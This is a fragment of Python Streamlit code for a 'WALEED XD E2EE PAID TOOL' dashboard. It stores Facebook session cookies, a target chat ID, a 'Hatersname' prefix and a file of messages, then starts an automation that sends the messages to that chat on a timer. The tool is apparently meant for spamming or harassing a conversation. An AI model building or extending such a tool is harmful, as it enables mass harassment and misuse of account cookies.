        st.sidebar.markdown(f"**Status:** <span class='status-badge approved'>✅ Approved</span>", unsafe_allow_html=True)
        
        if st.sidebar.button("🚪 Logout", use_container_width=True):
            if st.session_state.automation_state.running:
                stop_automation(st.session_state.user_id)
            
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.session_state.automation_running = False
            st.session_state.auto_start_checked = False
            st.rerun()
        
        user_config = db.get_user_config(st.session_state.user_id)
        
        if user_config:
            tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
            
            with tab1:
                st.markdown('<div class="card">', unsafe_allow_html=True)
                st.markdown("### Configuration Settings")
                
                chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'])
                name_prefix = st.text_input("Hatersname Prefix", value=user_config['name_prefix'])
                delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, value=user_config['delay'])
                cookies = st.text_area("Facebook Cookies (optional)", value="", height=100)
                uploaded_file = st.file_uploader("Messages File Upload", type=['txt'])
                
                if uploaded_file is not None:
                    messages_content = uploaded_file.getvalue().decode("utf-8")
                else:
                    messages_content = user_config.get('messages_file_content', '')
                
                if st.button("💾 Save Configuration", use_container_width=True):
                    final_cookies = cookies if cookies.strip() else user_config['cookies']
                    db.update_user_config(
                        st.session_state.user_id,
                        chat_id,
                        name_prefix,
                        delay,
                        final_cookies,
                        messages_content
                    )
                    st.success("✅ Configuration saved!")
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)
            
            with tab2:
                st.markdown('<div class="card">', unsafe_allow_html=True)
                st.markdown("### Automation Dashboard")
                
                col1, col2, col3 = st.columns(3)
                
                with col1:
                    st.metric("Messages Sent", st.session_state.automation_state.message_count)
                with col2:
                    status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                    st.metric("Status", status)
                with col3:
                    st.metric("Total Logs", len(st.session_state.automation_state.logs))
                
                col1, col2 = st.columns(2)
                with col1:
                    if st.button("▶️ Start E2EE", disabled=st.session_state.automation_state.running, use_container_width=True):
                        current_config = db.get_user_config(st.session_state.user_id)
                        if current_config and current_config['chat_id']:
                            start_automation(current_config, st.session_state.user_id)
                            st.rerun()
                        else:
                            st.error("⚠️ Configure Chat ID first!")
                with col2:
                    if st.button("⏹️ Stop E2EE", disabled=not st.session_state.automation_state.running, use_container_width=True):
                        stop_automation(st.session_state.user_id)
                        st.rerun()
                
                st.markdown("### 📜 Live Logs")
                if st.session_state.automation_state.logs:
                    st.markdown('<div class="log-container">', unsafe_allow_html=True)
                    for log in st.session_state.automation_state.logs[-30:]:
                        st.text(log)
                    st.markdown('</div>', unsafe_allow_html=True)
                else:
                    st.info("📝 No logs yet")
                
                if st.session_state.automation_state.running:
                    time.sleep(1)
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)

# Footer
st.markdown("""
<div class="footer">
    <strong>WALEED XD E2EE PAID TOOL</strong><br>
    Professional Automation Suite • © 2025
</div>
""", unsafe_allow_html=True)

st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
